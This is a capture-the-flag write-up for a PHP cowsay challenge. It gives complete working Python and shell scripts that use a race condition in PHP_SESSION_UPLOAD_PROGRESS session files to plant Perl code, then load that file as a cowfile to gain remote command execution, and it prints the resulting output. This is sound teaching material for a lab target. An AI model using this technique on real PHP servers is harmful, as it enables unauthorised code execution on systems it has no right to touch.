# globglogabgalab 2

## Write-up

- Since it is mentioned that this challenge is nearly identical to the last one, we can go ahead and check out the source code of `/cowsay.php` :

```php
<?php

error_reporting(0);

$output = null;

if (isset($_GET['message']) && is_string($_GET['message'])) {
  $regex = "/^[0-9a-zA-Z\/_\.]+$/";
  $cowacter = (isset($_GET['cowacter']) && is_string($_GET['cowacter'])) ? $_GET['cowacter'] : "default";
  $message = $_GET['message'];

  if (!preg_match($regex, $cowacter)
      || !preg_match($regex, $message)) {
    $output = "No";
  } else {
    $output = shell_exec("/usr/games/cowsay -f ${cowacter} ${message}");
  }

} else {
  highlight_file(__FILE__);
  exit;
}

?>

<!DOCTYPE html>
<html>
  <head>
    <title>Globglogabgalab</title>
  </head>
  <body>
    <pre><?= htmlspecialchars($output) ?></pre>
  </body>
</html>
```

- We can notice that a regex check has been added for `cowacter` and `message`, and it basically only allows the following characters : digits (0-9), lowercase letters (a-z), uppercase letters (A-Z), and `/_.`

- This makes it way harder to get command execution in `shell_exec("/usr/games/cowsay -f ${cowacter} ${message}")`

- Let's dig more into the `cowsay` command

- Command usage :

```man
cowsay [-e eye_string] [-f cowfile]  [-h]  [-l]  [-n]  [-T tongue_string] [-W column] [-bdgpstwy]
```

- From the man page :

```man
COWFILE FORMAT
       A cowfile is made up of a simple block  of  perl(1)  code,
       which assigns a picture of a cow to the variable $the_cow.
       Should you wish to customize the eyes or the tongue of the
       cow,  then  the  variables  $eyes and $tongue may be used.
       The trail leading up to the cow's message balloon is  com‐
       posed  of the character(s) in the $thoughts variable.  Any
       backslashes must be reduplicated to prevent interpolation.
       The  name  of a cowfile should end with .cow, otherwise it
       is assumed not to be a cowfile.   Also,  at-signs  (``@'')
       must be backslashed because that is what Perl 5 expects.
```

- That means that the cowfile is actually just a piece of `perl` code, and since we have control over `cowacter`, the task is to provide a perl file that has valid perl code to execute system commands

- But since we can't upload files to the server, how can we find a file that has such valid perl code ?

- The answer is [`php_session_upload_progress`](https://www.exploit-db.com/docs/50157) !

- As you can read on that paper, PHP will create a session file when you make a multipart POST request that has the `PHP_SESSION_UPLOAD_PROGRESS` post variable set while uploading a dummy file, but immediately removes the session file when the transfer completes : we have a race condition !

- And what's interesting about this race condition is that the session file will contain whatever value the `PHP_SESSION_UPLOAD_PROGRESS` variable holds, for example if it's set to `TEST`, here's an example of what the session file would look like :

```txt
upload_progress_TEST|a:5:{s:10:"start_time";i:1633103555;s:14:"content_length";i:3212778;s:15:"bytes_processed";i:5238;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:11:"random-file";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1633103555;s:15:"bytes_processed";i:5238;}}}
```

- An idea we can have is to inject perl code in the `PHP_SESSION_UPLOAD_PROGRESS` variable so that when we're exploiting the race condition and successfully manage to load the session file as a cowfile, the perl code gets executed

- By setting `PHP_SESSION_UPLOAD_PROGRESS` to `;system "id";#`, the content of the session file is considered valid perl code (the `#` comments out the rest of the serialized php data) :

```perl
upload_progress_;system "id";#|a:5:{s:10:"start_time";i:1633103555;s:14:"content_length";i:3212778;s:15:"bytes_processed";i:5238;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:11:"random-file";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1633103555;s:15:"bytes_processed";i:5238;}}}
```

- Let's start by writing some code that will trigger the creation of the session file ([trigger.py](trigger.py)) :

```python
import requests
from sys import argv

URL = "http://127.0.0.1:3007/cowsay.php"
UPLOAD_FILE = "/tmp/random-file"
PHPSESSID = "chenx3n"
SIZE = 4 * 1024**2 # 4MB

s = requests.Session()

def generate_randfile(size):
    with open("/dev/urandom", "rb") as f:
        data = f.read(size)
    with open(UPLOAD_FILE, "wb") as f:
        f.write(data)

def run(command):
    with open(UPLOAD_FILE, "rb") as f:
        # random 4MB file to be uploaded
        files = {"file": f}
        # PHPSESSID cookie, since it's set to "chenx3n", the session file will end up being "/tmp/sess_chenx3n"
        cookies = {"PHPSESSID": PHPSESSID}
        # inject perl code in PHP_SESSION_UPLOAD_PROGRESS post variable
        data = {"PHP_SESSION_UPLOAD_PROGRESS": f';system "{command}";#'}
        # trigger session file creation
        s.post(url=URL, files=files, data=data, cookies=cookies)

if __name__ == "__main__":
    cmd = argv[1] if len(argv) > 1 else "id;ls;./flag.runme"
    # generate a random 4MB file so that we have a sufficient time window before the session file is deleted on the server
    generate_randfile(SIZE)
    run(cmd)
```

- Then let's write exploit code that will actually try and load the session file ([xpl.py](xpl.py)) :

```python
import requests

URL = "http://127.0.0.1:3007/cowsay.php"
PHPSESSID = "chenx3n"

s = requests.Session()

def cowsay(cowacter, message):
    params = {"cowacter": cowacter, "message": message}
    return s.get(url=URL, params=params)

if __name__ == "__main__":
    cowacter = f"/tmp/sess_{PHPSESSID}"
    message = "kek"
    r = cowsay(cowacter, message)
    print(r.text)
```

- Now to combine all of this, we need to write a small shell script that will run both of the previous scripts in a while loop until we can read "shellmates" from the `flag.runme` output ([solve.sh](solve.sh)) :

```sh
while ! (echo "$output" | grep "shellmates"); do
  ./trigger.py &
  output="$(./xpl.py)"
done

echo "$output"
```

- After a few seconds of running `./solve.sh`, we can read the flag :

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Globglogabgalab</title>
  </head>
  <body>
    <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
cowsay.php
flag.runme
index.php
shellmates{Ooh_h4-h4-Ha_mMh_$PleNDId_s1MPly_d3L1ciouS}
 _____
&lt; kek &gt;
 -----
</pre>
  </body>
</html>
```

## Flag

`shellmates{Ooh_h4-h4-Ha_mMh_$PleNDId_s1MPly_d3L1ciouS}`
